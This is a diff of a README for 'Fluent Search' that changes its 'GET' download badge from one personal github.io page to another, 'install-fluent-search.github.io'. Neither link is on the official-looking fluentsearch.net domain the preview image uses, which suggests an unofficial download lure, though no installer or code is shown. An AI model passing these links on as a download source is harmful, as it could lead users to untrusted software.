@@ -1,7 +1,7 @@
 
 # Fluent Search
 
-[![GET](https://img.shields.io/badge/GET-Fluent%20Search-brightgreen?style=for-the-badge)](https://davisamber39428.github.io/.github/Fluent-Search)
+[![GET](https://img.shields.io/badge/GET-Fluent%20Search-brightgreen?style=for-the-badge)](https://install-fluent-search.github.io/.github/)
 
 ![Fluent Search Preview](https://www.fluentsearch.net/data/adirshamen/2022/90/FluentSearchMinimal.png)
 
